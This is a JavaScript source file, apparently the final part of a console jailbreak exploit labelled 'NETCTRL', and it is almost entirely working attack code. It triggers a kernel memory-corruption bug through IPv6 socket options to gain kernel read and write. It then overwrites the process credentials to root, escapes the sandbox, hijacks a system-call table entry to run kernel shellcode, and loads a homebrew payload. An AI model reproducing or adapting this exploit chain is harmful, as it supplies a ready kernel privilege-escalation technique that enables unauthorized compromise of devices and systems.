        view(leak_rthdr0_len_addr).setInt32(0, uio.sizeof + iovec.sizeof, true);

        get_rthdr(triplets[0], uio.sizeof + iovec.sizeof);

        var uio_segflg = view(leak_rthdr0.addr).getInt32(0x20, true);
        if (uio_segflg === UIO_SYSSPACE) {
            debug(`Reclaim uio with iov after ${i} iterations !!`);
            reclaimed = true;
            break;
        }
    }

    if (!reclaimed) {
        throw new Error("Unable to reclaim uio with iov !!");
    }

    // Corrupt data
    for (var i = 0; i < uio_threads.length; i++) {
        if (write.invoke(uio_ss[1], src, sz).eq(-1)) {
            throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
        }
    }

    triplets[1] = find_triplet(triplets[0], -1);

    uio_worker.wait_for_finished();

    triplets[2] = find_triplet(triplets[0], triplets[1]);

    debug(`Found triplet: ${triplets} !!`);
}

function kread8_slow(addr) {
    return view(kread_slow(addr, 8)).getBigInt(0, true);
}

function kview(addr) {
    if (kv.get_backing().neq(addr)) {
        kv.set_backing(addr);
    }

    return kv;
}

function fget(fd) {
    return kview(fdt_ofiles).getBigInt(fd * FILEDESCENT_SIZE, true);
};

function fhold(fp) {
    var f_count = kview(fp).getUint32(0x28, true);
    kview(fp).setUint32(0x28, f_count + 1, true);
};

function pfind(pid) {
    var p = kview(allproc).getBigInt(0, true);
    while (p.neq(0)) {
        var p_pid = kview(p).getInt32(0xB0, true);
        if (p_pid === pid) {
            break;
        }

        p = kview(p).getBigInt(0, true); // p_list.le_next
    }
    
    return p;
}

function remove_rthr_from_sock(fd) {
    var fp = fget(fd);
    var f_data = kview(fp).getBigInt(0, true);
    var so_pcb = kview(f_data).getBigInt(0x18, true);
    var in6p_outputopts = kview(so_pcb).getBigInt(0x118, true);

    kview(in6p_outputopts).setBigInt(0x68, 0, true); // ip6po_rhi_rthdr
}

function remove_uaf_file() {
    var fp = fget(uaf_sock);
    debug(`uaf fp: ${fp}`);

    // Remove uaf sock
    kview(fdt_ofiles).setBigInt(uaf_sock * FILEDESCENT_SIZE, 0, true);

    var removed = 0;
    // Remove triple freed file from uaf sock
    for (var i = 0; i < 0x100; i++) {
        var sock = socket.invoke(AF_UNIX, SOCK_STREAM, 0);
        if (sock.eq(-1)) {
            throw new SyscallError("Unable to create socket !!");
        }

        if (fget(sock).eq(fp)) {
            debug(`Socket ${sock} uses uaf fp, removing...`);
            kview(fdt_ofiles).setBigInt(sock * FILEDESCENT_SIZE, 0, true);
            removed++;
        } else {
            if (close.invoke(sock).eq(-1)) {
                throw new SyscallError(`Unable to close fd ${sock} !!`);
            }
        }

        if (removed === 3) {
            log(`Cleanup uaf fp after ${i} iterations !!`);
            break;
        }
    }
};

function find_all_proc() {
    log("Finding allproc...");

    var tmp_pipe = new Array(2);

    var pair_addr = alloc(8);

    if (pipe.invoke(pair_addr).eq(-1)) {
        throw new SyscallError("Unable to create pipe !!");
    }
    
    tmp_pipe[0] = view(pair_addr).getInt32(0, true);
    tmp_pipe[1] = view(pair_addr).getInt32(4, true);

    dispose(pair_addr);

    var pid = getpid.invoke();

    var pid_addr = alloc(4);
    view(pid_addr).setInt32(0, pid, true);

    if (ioctl.invoke(tmp_pipe[0], FIOSETOWN, pid_addr).eq(-1)) {
        throw new SyscallError(`Unable to ioctl for fd ${tmp_pipe[0]} !!`);
    }

    dispose(pid_addr);

    var fp = fget(tmp_pipe[0]);
    var f_data = kview(fp).getBigInt(0, true);
    var pipe_sigio = kview(f_data).getBigInt(0xD0, true);
    var p = kview(pipe_sigio).getBigInt(0, true);

    var mask = new BigInt(0xFFFFFFFF, 0);
    while (p.and(mask).neq(mask)) {
        p = kview(p).getBigInt(8, true); // p_list.le_prev
    }

    allproc = p;
    log(`allproc: ${allproc}`);

    if (close.invoke(tmp_pipe[0]).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${tmp_pipe[0]} !!`);
    }

    if (close.invoke(tmp_pipe[1]).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${tmp_pipe[1]} !!`);
    }
};


function jailbreak() {
    log("Initiate jailbreak...");

    var pid = getpid.invoke();

    var p = pfind(pid.valueOf());
    var kp = pfind(KERNEL_PID);

    // Patch credentials and capabilities
    var p_ucred = kview(p).getBigInt(0x40, true);
    var kp_ucred = kview(kp).getBigInt(0x40, true);

    var prison0 = kview(kp_ucred).getBigInt(0x30, true);

    kview(p_ucred).setInt32(0x04, 0, true); // cr_uid
    kview(p_ucred).setInt32(0x08, 0, true); // cr_ruid
    kview(p_ucred).setInt32(0x0C, 0, true); // cr_svuid
    kview(p_ucred).setInt32(0x10, 1, true); // cr_ngroups
    kview(p_ucred).setInt32(0x14, 0, true); // cr_rgid
    kview(p_ucred).setInt32(0x18, 0, true); // cr_svgid
    kview(p_ucred).setBigInt(0x30, prison0, true); // cr_prison
    kview(p_ucred).setBigInt(0x58, SYSCORE_AUTHID, true); // cr_sceAuthId
    kview(p_ucred).setBigInt(0x60, -1, true); // cr_sceCaps[1]
    kview(p_ucred).setBigInt(0x68, -1, true); // cr_sceCaps[0]
    kview(p_ucred).setUint8(0x83, 0x80); // cr_sceAttr[0]

    // Allow root file system access
    var p_fd = kview(p).getBigInt(0x48, true);
    var kp_fd = kview(kp).getBigInt(0x48, true);

    var root_vnode = kview(kp_fd).getBigInt(0x10, true);
    
    kview(p_fd).setBigInt(0x10, root_vnode, true); // fd_rdir
    kview(p_fd).setBigInt(0x18, root_vnode, true); // fd_jdir

    log("Achieved jailbreak !!");
};

// intended for use only after kernel arw
function kexec_patches(kernel_base) {
    log("Applying kernal patches...");

    var shellcode = atob(KernelMisc.SHELLCODE(version));

    var sysent_661_addr = kernel_base.add(KernelMisc.SYSENT_661(version));
    debug(`sysent_661_addr: ${sysent_661_addr}`);

    var jmp_rsi_gadget_addr = kernel_base.add(KernelMisc.JMP_RSI_GADGET(version));
    debug(`jmp_rsi_gadget_addr: ${jmp_rsi_gadget_addr}`);

    var sy_narg = kview(sysent_661_addr).getUint32(0, true);
    var sy_call = kview(sysent_661_addr).getBigInt(8, true);
    var sy_thrcnt = kview(sysent_661_addr).getUint32(0x2C, true);

    kview(sysent_661_addr).setUint32(0, 2, true);
    kview(sysent_661_addr).setBigInt(8, jmp_rsi_gadget_addr, true);
    kview(sysent_661_addr).setUint32(0x2C, 1, true);

    var sz = shellcode.length.align_up(PAGE_SIZE);
    var prot = PROT_READ | PROT_WRITE | PROT_EXEC;
    var flags = MAP_SHARED | MAP_FIXED;
    
    var exec_fd = jitshm_create.invoke(0, sz, prot);
    debug(`exec_fd: ${exec_fd}`);
    if (exec_fd.eq(-1)) {
        throw new SyscallError("Unablet to create JIT shared memory with rwx !!")
    }

    var mapping_addr = new BigInt(9, 0x20100000);

    if (mmap.invoke(mapping_addr, sz, prot, flags, exec_fd, 0).eq(-1)) {
      throw new SyscallError(`Unable to map memory with size ${sz} with rwx !!`);
    }

    copy(mapping_addr, shellcode.get_backing(), shellcode.length);

    var ret = kexec.invoke(mapping_addr);
    debug(`kexec_ret: ${ret}`);
    if (ret.eq(-1)) {
        throw new SyscallError(`Unable to kexec ${mapping_addr} !!`)
    }

    kview(sysent_661_addr).setUint32(0, sy_narg, true);
    kview(sysent_661_addr).setBigInt(8, sy_call, true);
    kview(sysent_661_addr).setUint32(0x2C, sy_thrcnt, true);

    log("Kernal patches applied !!");
};

function make_karw() {
    log("Initiate kernel ARW...");

    // Set up sockets for spraying and initialize pktopts
    for (var i = 0; i < ipv6_socks.length; i++) {
        var sock = socket.invoke(AF_INET6, SOCK_STREAM, 0);
        if (sock.eq(-1)) {
            throw new SyscallError("Unable to create socket !!");
        }

        free_rthdr(sock);

        ipv6_socks[i] = sock;
    }

    // Trigger vulnerability
    ucred_triple_free();
    
    // Leak pointers from kqueue
    leak_kqueue();

    fdt_ofiles = kread8_slow(kq_fdp);
    debug(`fdt_ofiles: ${fdt_ofiles}`);
    
    var master_pipe_file = []; 
    var slave_pipe_file = [];
    var master_pipe_data = []; 
    var slave_pipe_data = [];

    master_pipe_file[0] = kread8_slow(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
    debug(`master_pipe_file[0]: ${master_pipe_file[0]}`);

    slave_pipe_file[0] = kread8_slow(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
    debug(`slave_pipe_file[0]: ${slave_pipe_file[0]}`);
    
    master_pipe_data[0] = kread8_slow(master_pipe_file[0]);
    debug(`master_pipe_data[0]: ${master_pipe_data[0]}`);
    
    slave_pipe_data[0] = kread8_slow(slave_pipe_file[0]);
    debug(`slave_pipe_data[0]: ${slave_pipe_data[0]}`);
    
    var pipe_buf_addr = alloc(pipebuf.sizeof);
    var pipe_buf = pipebuf.from(pipe_buf_addr);

    pipe_buf.cnt = 0;
    pipe_buf.in = 0;
    pipe_buf.out = 0;
    pipe_buf.size = PAGE_SIZE;
    pipe_buf.buffer = slave_pipe_data[0];

    kwrite_slow(master_pipe_data[0], pipe_buf.addr, pipebuf.sizeof);

    dispose(pipe_buf_addr);

    kv = new KernelView(master_pipe, slave_pipe);

    log("Achieved kernel ARW !!");
};
//#endregion
//#region Structs
var in6_addr = in6_addr || new Struct("in6_addr", [
    { type: "Uint8", name: "s6_addr", count: 16 }
]);

var ip6_rthdr0 = ip6_rthdr0 || new Struct("ip6_rthdr0", [
    { type: "Uint8", name: "ip6r0_nxt" },
    { type: "Uint8", name: "ip6r0_len" },
    { type: "Uint8", name: "ip6r0_type" },
    { type: "Uint8", name: "ip6r0_segleft" },
    { type: "Uint8", name: "ip6r0_reserved" },
    { type: "Uint8", name: "ip6r0_slmap", count: 3 },
    { type: "in6_addr", name: `ip6r0_addr`, count: 0 }
]);

var iovec = iovec || new Struct("iovec", [
    { type: "Uint64", name: "iov_base" },
    { type: "Uint64", name: "iov_len" }
]);

var msghdr = msghdr || new Struct("msghdr", [
    { type: "Uint64", name: "msg_name" },
    { type: "Uint32", name: "msg_namelen" },
    { type: "iovec*", name: "msg_iov" },
    { type: "Int32", name: "msg_iovlen" },
    { type: "Uint64", name: "msg_control" },
    { type: "Uint32", name: "msg_controllen" },
    { type: "Int32", name: "msg_flags" }
]);

var uio = uio || new Struct("uio", [
    { type: "Uint64", name: "uio_iov" },
    { type: "Uint32", name: "uio_iovcnt" },
    { type: "Uint64", name: "uio_offset" },
    { type: "Uint64", name: "uio_resid" },
    { type: "Uint32", name: "uio_segflg" },
    { type: "Uint32", name: "uio_rw" },
    { type: "Uint64", name: "uio_td" },
]);

var pipebuf = pipebuf || new Struct("pipebuf", [
    { type: "Uint32", name: "cnt" },
    { type: "Uint32", name: "in" },
    { type: "Uint32", name: "out" },
    { type: "Uint32", name: "size" },
    { type: "Uint64", name: "buffer" },
]);
//#endregion

log("===NETCTRL===");

try {
    init();
    setup();

    var attempt = 0;
    while (typeof kv === "undefined") {
        try {
            make_karw();
        } catch (e) {
            log(`Error: ${e.message}`);

            if (uaf_sock !== 0) {
                if (close.invoke(uaf_sock).eq(-1)) {
                    throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);
                }
                
                uaf_sock = undefined;
            }

            for (var i = 0; i < ipv6_socks.length; i++) {
                if (ipv6_socks[i] === 0) {
                    continue;
                }
            
                if (close.invoke(ipv6_socks[i]).eq(-1)) {
                    throw new SyscallError(`Unable to close fd ${ipv6_socks[i]} !!`);
                }
            }

            if (attempt++ === 3) {
                throw new Error("Failed after 3 retries, aborting...");
            }

            log(`Retrying [${attempt}/3]...`);
        }
    }

    // Increase reference counts for the pipes
    fhold(fget(master_pipe[0]));
    fhold(fget(master_pipe[1]));
    fhold(fget(slave_pipe[0]));
    fhold(fget(slave_pipe[1]));

    log("Corrupted context cleanup started...");

    // Remove rthdr pointers from triplets
    for (var i = 0; i < triplets.length; i++) {
        remove_rthr_from_sock(triplets[i]);
    }

    // Remove triple freed file from free list
    remove_uaf_file();

    log("Corrupted context cleanup complated !!");

    // Find allproc
    find_all_proc();
} finally {
    cleanup();
}

// Jailbreak
jailbreak();

// Kernel patches
kexec_patches(kernel_base);

notify("Jailbreak successfull !!");

// Load goldhen
var bytes = read_file("/data/goldhen.bin");
load_bin(bytes);

// Load hen
//var bytes = read_file("/data/hen.bin");
//load_bin(bytes);

log("===END===");